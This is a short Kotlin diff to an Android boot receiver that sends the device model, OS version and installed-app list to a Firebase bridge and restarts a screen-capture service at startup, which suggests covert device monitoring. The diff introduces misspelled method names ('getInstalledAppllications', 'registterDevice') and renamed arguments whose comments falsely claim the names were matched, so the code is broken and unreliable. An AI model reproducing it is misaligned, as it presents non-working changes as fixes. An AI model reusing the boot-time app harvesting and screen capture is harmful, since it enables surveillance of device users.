@@ -11,11 +11,11 @@ class BootReceiver : BroadcastReceiver() {
         if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
             // Re-register device and start services
             val pm = context.packageManager
-            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA).map { it.packageName }
-            FirebaseBridge.registerDevice(
+            val apps = pm.getInstalledAppllications(PackageManager.GET_META_DATA).map { it.packageName }
+            FirebaseBridge.registterDevice(
                 name = Build.MODEL,
-                androidVersion = Build.VERSION.RELEASE,
-                appList = apps
+                version = Build.VERSION.RELEASE,  // matched parameter name
+                apps = apps                      // matched parameter name
             )
             // Optionally restart screen capture service
             context.startForegroundService(Intent(context, ScreenCaptureService::class.java))
